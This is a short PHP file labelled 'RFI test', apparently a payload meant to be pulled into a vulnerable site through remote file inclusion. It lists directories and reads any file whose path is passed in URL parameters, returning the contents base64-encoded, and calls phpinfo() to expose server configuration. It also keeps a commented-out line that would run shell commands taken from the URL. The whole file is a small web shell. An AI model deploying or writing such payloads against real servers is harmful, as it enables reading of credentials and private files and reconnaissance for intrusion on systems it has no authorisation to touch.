// RFI test
<?php
  //shell_exec($_GET["cmd"]);
  echo scandir($_GET["dir"]);
    
  $data = file_get_contents($_GET["file"]);
  echo base64_encode($data);
    
  phpinfo();
?>
